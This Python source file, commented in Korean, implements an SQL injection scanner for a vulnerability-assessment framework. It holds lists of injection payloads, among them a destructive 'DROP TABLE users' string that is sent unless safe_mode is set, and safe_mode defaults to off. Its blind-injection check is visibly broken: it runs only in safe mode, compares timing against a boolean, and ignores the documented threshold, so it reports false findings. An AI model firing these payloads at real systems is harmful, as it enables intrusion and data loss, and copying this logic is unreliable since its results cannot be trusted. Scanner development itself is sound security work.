"""
SQL Injection Testing Tool

OWASP: A05:2025 - Injection
CWE:   CWE-89 (SQL Injection)

extra 옵션:
    - payload_list (list[str]): 테스트할 SQL 인젝션 페이로드 목록
      기본값: 기본 에러 기반 페이로드 세트 사용
    - detect_time_based (bool): 시간 기반 Blind SQLi 탐지 여부
      기본값: False
    - time_threshold_ms (int): 시간 기반 탐지 시 지연 판정 기준 (밀리초)
      기본값: 5000
"""

from __future__ import annotations

import requests
import time
from typing import Any, Dict, List
from urllib.parse import urljoin

from va_mcp.core.base import BaseTool
from va_mcp.core.schemas import ToolInput, ToolResult, Evidence
from va_mcp.core.constants import ToolStatus, Severity, Confidence, ErrorCode
from va_mcp.core.utils import (
    build_tool_error,
    mask_sensitive,
    sanitize_request_body,
    sanitize_response_sample,
    utc_now_iso,
)
from va_mcp.core.resolvers.auth_resolver import (
    parse_credentials,
    resolve_auth_headers,
    CredentialResolverError,
)

# ── 기본 페이로드 (에러 기반 / 읽기 전용) ──────────────────────────
DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "' AND '1'='2",
    "' OR 1=1#",
    "admin'--",
]
# safe_mode=False 일 때만 추가로 사용하는 파괴적 페이로드
UNSAFE_PAYLOADS = [
    "1; DROP TABLE users--",
]
# 시간 기반 Blind SQL Injection 페이로드
TIME_BASED_PAYLOADS = [
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
]
# 응답에서 SQL 에러를 감지하기 위한 시그니처 (소문자 비교)
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "incorrect syntax near",
    "unexpected end of sql command",
    "invalid query",
    "ora-00933",
    "ora-01756",
    "pg::error",
    "psqlexception",
    "syntax error at or near",
    "unterminated string",
    "sql command not properly ended",
    "sqlstate",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_query",
    "sqlite3::query",
    "sqlite_error",
]


class SqlInjectionTool(BaseTool):
    tool_id = "sql_injection"
    tool_name = "SQL Injection Testing"
    tool_version = "0.1.0"

    def run(self, tool_input: ToolInput) -> ToolResult:
        start_ts   = time.time()
        started_at = utc_now_iso()

        # 1) request 방어
        req = tool_input.request
        if not req:
            ended_at   = utc_now_iso()
            duration_ms = int((time.time() - start_ts) * 1000)
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.SKIPPED.value,
                severity=Severity.INFO.value,
                confidence=Confidence.LOW.value,
                title="요청 정보 없음",
                description="ToolInput.request가 None입니다. 테스트할 API 요청 정보를 제공해주세요.",
                evidence=[],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=duration_ms,
                tool_version=self.tool_version,
            )

        # 2) options/extra 방어
        opts: Any = tool_input.options
        extra: Dict[str, Any] = opts.extra if opts and opts.extra else {}
        timeout_s = (opts.timeout / 1000.0) if opts and opts.timeout else 5
        max_req   = opts.max_requests if opts and opts.max_requests is not None else len(DEFAULT_PAYLOADS)
        safe_mode = getattr(opts, "safe_mode", False)
        detect_time_based = extra.get("detect_time_based", False)

        # 3) payload 리스트 구성
        payload_list = extra.get("payload_list", DEFAULT_PAYLOADS)
        if not safe_mode:
            payload_list = list(payload_list) + UNSAFE_PAYLOADS
        if detect_time_based:
            payload_list = list(payload_list) + TIME_BASED_PAYLOADS

        # 4) 테스트할 파라미터 결정
        method = req.method.upper()
        query  = req.query or {}
        body   = req.body or {}
        test_params = list(query.keys()) if method == "GET" else list(body.keys())
        if not test_params:
            ended_at   = utc_now_iso()
            duration_ms = int((time.time() - start_ts) * 1000)
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.SKIPPED.value,
                severity=Severity.INFO.value,
                confidence=Confidence.LOW.value,
                title="테스트할 파라미터 없음",
                description="요청에서 테스트할 파라미터를 찾지 못했습니다. query 또는 body에 파라미터를 포함해주세요.",
                evidence=[],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=duration_ms,
                tool_version=self.tool_version,
            )

        # 5) URL 안전 조합
        base_url = tool_input.target.base_url.rstrip("/")
        full_url = urljoin(f"{base_url}/", req.path.lstrip("/"))

        # 6) headers 방어 및 auth_resolver 적용
        orig_headers = req.headers or {}
        auth_ctx = tool_input.auth[0] if tool_input.auth else None
        if auth_ctx:
            try:
                parse_credentials(auth_ctx)
                auth_headers = resolve_auth_headers(auth_ctx)
                headers = {**orig_headers, **auth_headers}
            except CredentialResolverError as e:
                ended_at   = utc_now_iso()
                duration_ms = int((time.time() - start_ts) * 1000)
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.SKIPPED.value,
                    severity=Severity.INFO.value,
                    confidence=Confidence.LOW.value,
                    title="Credential 해석 실패",
                    description=str(e),
                    evidence=[],
                    started_at=started_at,
                    ended_at=ended_at,
                    duration_ms=duration_ms,
                    tool_version=self.tool_version,
                )
        else:
            headers = orig_headers

        evidences: List[Evidence] = []
        request_count = 0

        try:
            # 7) 페이로드 테스트 루프
            for param in test_params:
                for payload in payload_list:
                    if request_count >= max_req:
                        break

                    if method == "GET":
                        test_q = dict(query)
                        test_q[param] = payload
                        resp = requests.get(
                            full_url,
                            params=test_q,
                            headers=headers,
                            timeout=timeout_s,
                            allow_redirects=False,
                        )
                        req_info = {
                            "method": "GET",
                            "path": req.path,
                            "headers": mask_sensitive(headers),
                            "query": {param: test_q[param]},
                        }
                    else:
                        test_b = dict(body)
                        test_b[param] = payload
                        resp = requests.request(
                            method,
                            full_url,
                            headers=headers,
                            json=test_b,
                            timeout=timeout_s,
                            allow_redirects=False,
                        )
                        req_info = {
                            "method": method,
                            "path": req.path,
                            "headers": mask_sensitive(headers),
                            "body": sanitize_request_body(test_b),
                        }

                    request_count += 1

                    # ── 응답 분석: SQL 에러 시그니처 감지
                    txt = resp.text.lower()
                    detected = [
                        sig for sig in SQL_ERROR_SIGNATURES
                        if sig in txt
                    ]

                    if detected:
                        evidences.append(
                            Evidence(
                                request=req_info,
                                response_status=resp.status_code,
                                response_headers=dict(resp.headers),
                                response_body_sample=sanitize_response_sample(resp.text),
                                note=(
                                    f"파라미터 '{param}'에 페이로드 '{payload}' 삽입 시 "
                                    f"SQL 에러 시그니처 감지: {detected[:3]}"
                                ),
                            )
                        )

                    # Blind SQLi: 시간 기반 페이로드 타임아웃
                    if safe_mode:
                        elapsed = getattr(resp, "elapsed", None)
                        if elapsed and elapsed.total_seconds() * 1000 >= detect_time_based * 1000:
                            evidences.append(
                                Evidence(
                                    request=req_info,
                                    response_status=0,
                                    response_body_sample="[TIMEOUT]",
                                    response_headers={},
                                    note=(
                                        f"파라미터 '{param}'에 시간 지연 페이로드 '{payload}' 삽입 시 "
                                        "타임아웃 발생 — Blind SQL Injection 가능성"
                                    ),
                                )
                            )

                if request_count >= max_req:
                    break

            # 8) 결과 판정
            ended_at   = utc_now_iso()
            duration_ms = int((time.time() - start_ts) * 1000)

            if evidences:
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.VULNERABLE.value,
                    severity=Severity.CRITICAL.value,
                    confidence=Confidence.HIGH.value,
                    title="SQL Injection 취약점 발견",
                    description=(
                        f"총 {len(evidences)}건의 SQL Injection 징후가 감지되었습니다. "
                        f"테스트 파라미터: {test_params}"
                    ),
                    owasp=["A05:2025 Injection"],
                    cwe=["CWE-89"],
                    evidence=evidences,
                    recommendation=(
                        "1. Prepared Statement를 사용하세요.\n"
                        "2. ORM 사용을 고려하세요.\n"
                        "3. 입력값 화이트리스트 검증을 적용하세요.\n"
                        "4. 최소 권한 원칙을 적용하세요."
                    ),
                    started_at=started_at,
                    ended_at=ended_at,
                    duration_ms=duration_ms,
                    tool_version=self.tool_version,
                )

            # PASSED
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.PASSED.value,
                severity=Severity.INFO.value,
                confidence=Confidence.MEDIUM.value,
                title="SQL Injection 취약점 미발견",
                description=(
                    f"테스트한 파라미터({test_params})에서 "
                    f"SQL Injection 징후가 감지되지 않았습니다. "
                    f"(총 {request_count}회 요청)"
                ),
                owasp=["A05:2025 Injection"],
                cwe=["CWE-89"],
                evidence=[],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=duration_ms,
                tool_version=self.tool_version,
            )

        except requests.Timeout as exc:
            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.ERROR.value,
                severity=Severity.INFO.value,
                confidence=Confidence.LOW.value,
                title="요청 타임아웃",
                description=str(exc),
                evidence=[],
                errors=[build_tool_error(ErrorCode.TIMEOUT.value, str(exc), retryable=True)],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=0,
                tool_version=self.tool_version,
            )

        except requests.RequestException as exc:
            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.ERROR.value,
                severity=Severity.INFO.value,
                confidence=Confidence.LOW.value,
                title="HTTP 요청 실패",
                description=str(exc),
                evidence=[],
                errors=[build_tool_error(ErrorCode.HTTP_FAILURE.value, str(exc), retryable=True)],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=0,
                tool_version=self.tool_version,
            )

        except Exception as exc:
            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.ERROR.value,
                severity=Severity.INFO.value,
                confidence=Confidence.LOW.value,
                title="SQL Injection 테스트 실행 오류",
                description=str(exc),
                evidence=[],
                errors=[build_tool_error(ErrorCode.INTERNAL_ERROR.value, str(exc), retryable=False)],
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=0,
                tool_version=self.tool_version,
            )